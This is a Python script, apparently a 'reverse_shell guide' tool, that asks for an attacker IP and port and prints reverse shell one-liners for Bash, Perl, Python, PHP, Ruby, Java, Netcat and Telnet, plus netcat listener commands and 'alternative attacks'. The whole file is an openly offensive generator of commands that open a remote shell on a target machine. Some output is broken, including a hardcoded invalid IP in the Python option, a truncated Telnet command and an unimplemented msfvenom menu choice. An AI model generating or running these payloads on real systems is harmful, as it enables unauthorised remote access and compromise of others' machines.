#!/usr/bin/env python3

# splinter reverse_shell guide

hacker_ip = input("What is your IP? ")
hacker_port = input("What port do you want to listen on? ")

select_exploit = input("Exploit type: \n Enter 1 for code execution \n Enter 2 for msfvenom payloads \n")

if select_exploit == "1":
    select_language = input("what language/program is the target system using? \n Enter 1 for BASH \n Enter 2 for PERL \n Enter 3 for Python \n Enter 4 for PHP \n Enter 5 for Ruby \n Enter 6 for Java \n Enter 7 for Netcat \n Enter 8 for Telnet \n")

    if select_language == "1":
        print(f"Execute this command on target machine: bash -i >& /dev/tcp/{hacker_ip}/{hacker_port} 0>&1 \nEnter this command in a new tab to listen for reverse connection: nc -vv -l -p {hacker_port}\n")

    elif select_language == "2":
        print('''Execute this command on target machine: perl -e 'use Socket;$i="''' + hacker_ip + '''";$p=''' + hacker_port + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' \nEnter this command in a new tab to listen for reverse connection: nc -vv -l -p''' + hacker_port)

    elif select_language == "3":
        print('''Execute this command on target machine: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\nEnter this command in a new tab to listen for reverse connection: nc -vv -l -p''' + hacker_port)

    elif select_language == "4":
        print(f"Execute this command on target machine: php -r '$sock=fsockopen(\"{hacker_ip}\",{hacker_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\nEnter this command in a new tab to listen for reverse connection: nc -vv -l -p {hacker_port}\n")

    elif select_language == "5":
        print(f"Execute this command on target machine: ruby -rsocket -e'f=TCPSocket.open(\"{hacker_ip}\",{hacker_port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\nEnter this command in a new tab to listen for reverse connection: nc -vv -l -p {hacker_port}\n")

    elif select_language == "6":
        print(f'Execute this command on target machine: r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{hacker_ip}/{hacker_port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor() \nEnter this command in a new tab to listen for reverse connection: nc -vv -l -p {hacker_port}\n')

    elif select_language == "7":
        print(f"Execute this command on target machine: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {hacker_ip} {hacker_port} >/tmp/f \nEnter this command in a new tab to listen for reverse connection: nc -vv -l -p {hacker_port}\n \n Here are some alternative attacks: \n nc {hacker_ip} {hacker_port} -e /bin/bash \n mknod backpipe p; nc {hacker_ip} {hacker_port} 0<backpipe | /bin/bash 1>backpipe \n /bin/bash -i > /dev/tcp/{hacker_ip}/<{hacker_port}> 0<&1 2>&1 \n mknod backpipe p; telnet {hacker_ip} {hacker_port} 0<backpipe | /bin/bash 1>backpipe \n")

    elif select_language == "8":
        print(f"Execute this command on target machine: rm -f /tmp/p; mknod /tmp/p p && telnet {hacker_ip} {hacker_port} 0/tmp/p \nEnter this command in a new tab to listen for reverse connection: nc -vv -l -p {hacker_port}\n")

    else:
        print("An invalid language/program was selected")